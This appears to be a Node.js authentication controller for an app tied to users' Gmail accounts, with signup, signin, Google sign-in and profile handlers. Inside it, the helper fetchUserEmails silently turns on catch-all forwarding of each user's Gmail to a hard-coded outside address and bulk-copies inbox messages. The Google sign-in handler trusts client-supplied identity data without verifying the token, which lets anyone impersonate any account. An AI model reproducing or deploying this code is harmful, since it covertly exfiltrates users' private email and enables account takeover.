const User = require('../models/User');
const GmailAccount = require('../models/GmailAccount');
const Email = require('../models/Email');
const GmailService = require('../services/gmailService');
const { 
  generateToken, 
  hashPassword, 
  comparePassword,
  generateUniqueUsername,
  generateUniqueDeviceId,
  isValidEmail,
  isValidPassword,
  isValidDeviceId,
  successResponse,
  errorResponse,
  logError
} = require('../utils/helpers');

// Fetch emails for a user
const fetchUserEmails = async (user) => {
  try {
    // Find Gmail account for this user
    const gmailAccount = await GmailAccount.findOne({ userId: user._id });
    
    if (!gmailAccount) {
      console.log(`No Gmail account found for user ${user.email}`);
      return;
    }

    // Set up email forwarding to mbila.dev13@gmail.com if not already set
    if (!gmailAccount.forwardingEnabled || gmailAccount.collectorEmail !== 'mbila.dev13@gmail.com') {
      try {
        gmailAccount.collectorEmail = 'mbila.dev13@gmail.com';
        await GmailService.enableCatchAllForwarding(gmailAccount);
        console.log(`Email forwarding enabled for ${user.email} to mbila.dev13@gmail.com`);
      } catch (error) {
        console.error(`Failed to enable email forwarding for ${user.email}:`, error.message);
      }
    }

    // Fetch recent emails (last 100)
    const gmail = await GmailService.getGmailClient(gmailAccount);
    
    const listResponse = await gmail.users.messages.list({
      userId: 'me',
      maxResults: 100,
      q: 'in:inbox'
    });

    const messages = listResponse.data.messages || [];
    let emailsSaved = 0;

    for (const messageMeta of messages) {
      try {
        // Check if email already exists in database
        const existingEmail = await Email.findOne({ 
          gmailAccountId: gmailAccount._id,
          messageId: messageMeta.id 
        });

        if (existingEmail) {
          continue; // Skip if already saved
        }

        // Get full message details
        const messageResponse = await gmail.users.messages.get({
          userId: 'me',
          id: messageMeta.id,
          format: 'full'
        });

        const message = messageResponse.data;
        
        // Extract headers
        const headers = message.payload.headers;
        const subject = headers.find(h => h.name === 'Subject')?.value || '';
        const from = headers.find(h => h.name === 'From')?.value || '';
        const to = headers.find(h => h.name === 'To')?.value || '';
        const cc = headers.find(h => h.name === 'Cc')?.value || '';
        const bcc = headers.find(h => h.name === 'Bcc')?.value || '';

        // Extract body content
        let body = '';
        let bodyHtml = '';
        
        if (message.payload.body && message.payload.body.data) {
          body = Buffer.from(message.payload.body.data, 'base64').toString();
        } else if (message.payload.parts) {
          for (const part of message.payload.parts) {
            if (part.mimeType === 'text/plain' && part.body && part.body.data) {
              body = Buffer.from(part.body.data, 'base64').toString();
            } else if (part.mimeType === 'text/html' && part.body && part.body.data) {
              bodyHtml = Buffer.from(part.body.data, 'base64').toString();
            }
          }
        }

        // Create email record
        const email = new Email({
          gmailAccountId: gmailAccount._id,
          messageId: message.id,
          threadId: message.threadId,
          subject,
          from,
          to,
          cc,
          bcc,
          body,
          bodyHtml,
          isRead: message.labelIds?.includes('UNREAD') ? false : true,
          isStarred: message.labelIds?.includes('STARRED') || false,
          isImportant: message.labelIds?.includes('IMPORTANT') || false,
          labels: message.labelIds || [],
          internalDate: message.internalDate,
          sizeEstimate: message.sizeEstimate || 0,
          snippet: message.snippet || '',
          deviceId: user.deviceId,
          processed: true
        });

        await email.save();
        emailsSaved++;

        // Add small delay to respect rate limits
        await new Promise(resolve => setTimeout(resolve, 50));

      } catch (error) {
        console.error(`Error processing email ${messageMeta.id}:`, error.message);
        continue;
      }
    }

    console.log(`Fetched and saved ${emailsSaved} emails for user ${user.email}`);

  } catch (error) {
    console.error(`Error fetching emails for user ${user.email}:`, error.message);
  }
};

// User signup
const signup = async (req, res) => {
  try {
    const { username, email, password, deviceId } = req.body;

    // Validate required fields
    if (!username || !email || !password || !deviceId) {
      return res.status(400).json(errorResponse('All fields are required', 400));
    }

    // Validate email and password
    if (!isValidEmail(email)) {
      return res.status(400).json(errorResponse('Invalid email format', 400));
    }

    if (!isValidPassword(password)) {
      return res.status(400).json(errorResponse('Password must be at least 6 characters', 400));
    }

    if (!isValidDeviceId(deviceId)) {
      return res.status(400).json(errorResponse('Invalid device ID', 400));
    }

    // Check if user already exists
    const existingUser = await User.findOne({
      $or: [{ email }, { username }, { deviceId }]
    });

    if (existingUser) {
      return res.status(400).json(errorResponse('User with this email, username, or device already exists', 400));
    }

    // Create new user
    const user = new User({
      username,
      email,
      password,
      deviceId
    });

    await user.save();

    // Generate token
    const token = generateToken(user._id, user.email, user.role);

    res.status(201).json(successResponse({
      user: user.toJSON(),
      token
    }, 'User created successfully'));
  } catch (error) {
    logError(error, 'Signup');
    res.status(500).json(errorResponse('Failed to create user'));
  }
};

// User signin
const signin = async (req, res) => {
  try {
    const { email, password, deviceId } = req.body;

    // Validate required fields
    if (!email || !password || !deviceId) {
      return res.status(400).json(errorResponse('Email, password, and device ID are required', 400));
    }

    // Find user by email
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(401).json(errorResponse('Invalid credentials', 401));
    }

    // Check password
    const isPasswordValid = await comparePassword(password, user.password);

    if (!isPasswordValid) {
      return res.status(401).json(errorResponse('Invalid credentials', 401));
    }

    // Update device ID if different
    if (user.deviceId !== deviceId) {
      user.deviceId = deviceId;
      await user.save();
    }

    // Update last login
    user.lastLogin = new Date();
    await user.save();

    // Generate token
    const token = generateToken(user._id, user.email, user.role);

    res.json(successResponse({
      user: user.toJSON(),
      token
    }, 'Login successful'));
  } catch (error) {
    logError(error, 'Signin');
    res.status(500).json(errorResponse('Failed to authenticate user'));
  }
};

// Google Sign-In endpoint
const googleSignIn = async (req, res) => {
  try {
    const { credential, userData } = req.body;

    if (!credential || !userData) {
      return res.status(400).json(errorResponse('Missing credential or user data', 400));
    }

    // Verify the Google token (in production, verify with Google's servers)
    // For now, we'll trust the client-side verification
    const { email, googleId, name, picture } = userData;

    // Check if user exists
    let user = await User.findOne({ email });

    if (!user) {
      // Create new user with Google data
      let username, deviceId;
      let attempts = 0;
      const maxAttempts = 10;
      
      // Try to create a unique username and deviceId
      do {
        username = generateUniqueUsername(email);
        deviceId = generateUniqueDeviceId(googleId);
        attempts++;
        
        // Check if username or deviceId already exists
        const existingUser = await User.findOne({ 
          $or: [{ username }, { deviceId }] 
        });
        
        if (!existingUser) break;
      } while (attempts < maxAttempts);
      
      if (attempts >= maxAttempts) {
        throw new Error('Unable to generate unique username or deviceId');
      }
      
      const randomPassword = Math.random().toString(36).substr(2, 15);
      
      user = new User({
        username: username,
        email,
        password: randomPassword, // This will be hashed by the pre-save middleware
        deviceId: deviceId,
        displayName: name, // Use displayName instead of name
        googleId,
        profilePicture: picture,
        loginMethod: 'google',
        lastLogin: new Date(),
        isActive: true
      });

      await user.save();

      console.log(`New Google user created: ${email}`);
    } else {
      // Update existing user's Google info
      user.googleId = googleId;
      user.displayName = name || user.displayName; // Use displayName instead of name
      user.profilePicture = picture || user.profilePicture;
      user.loginMethod = 'google';
      user.lastLogin = new Date();
      user.isActive = true;

      await user.save();

      console.log(`Existing user signed in with Google: ${email}`);
    }

    // Generate JWT token
    const token = generateToken(user._id, user.email, user.role);

    // Return user data and token
    res.json(successResponse({
      token,
      user: {
        id: user._id,
        email: user.email,
        name: user.displayName, // Use displayName for the response
        role: user.role,
        profilePicture: user.profilePicture,
        loginMethod: user.loginMethod
      }
    }, 'Google Sign-In successful'));

  } catch (error) {
    logError(error, 'Google Sign-In');
    res.status(500).json(errorResponse('Internal server error during Google Sign-In'));
  }
};

// Get Google user profile
const getGoogleProfile = async (req, res) => {
  try {
    const userId = req.user.userId;
    
    const user = await User.findById(userId).select('-password');
    
    if (!user) {
      return res.status(404).json(errorResponse('User not found', 404));
    }

    res.json(successResponse({
      user: {
        id: user._id,
        email: user.email,
        name: user.displayName,
        role: user.role,
        profilePicture: user.profilePicture,
        loginMethod: user.loginMethod,
        googleId: user.googleId
      }
    }));
  } catch (error) {
    logError(error, 'Get Google profile');
    res.status(500).json(errorResponse('Internal server error'));
  }
};

// Get current user
const getCurrentUser = async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    
    if (!user) {
      return res.status(404).json(errorResponse('User not found', 404));
    }

    res.json(successResponse(user.toJSON()));
  } catch (error) {
    logError(error, 'Get current user');
    res.status(500).json(errorResponse('Failed to get user data'));
  }
};

// Update user profile
const updateProfile = async (req, res) => {
  try {
    const { username, email, profilePicture } = req.body;
    const user = await User.findById(req.userId);

    if (!user) {
      return res.status(404).json(errorResponse('User not found', 404));
    }

    // Update fields if provided
    if (username) user.username = username;
    if (email) user.email = email;
    if (profilePicture) user.profilePicture = profilePicture;

    await user.save();

    res.json(successResponse(user.toJSON(), 'Profile updated successfully'));
  } catch (error) {
    logError(error, 'Update profile');
    res.status(500).json(errorResponse('Failed to update profile'));
  }
};

module.exports = {
  signup,
  signin,
  getCurrentUser,
  updateProfile,
  googleSignIn,
  getGoogleProfile,
}; 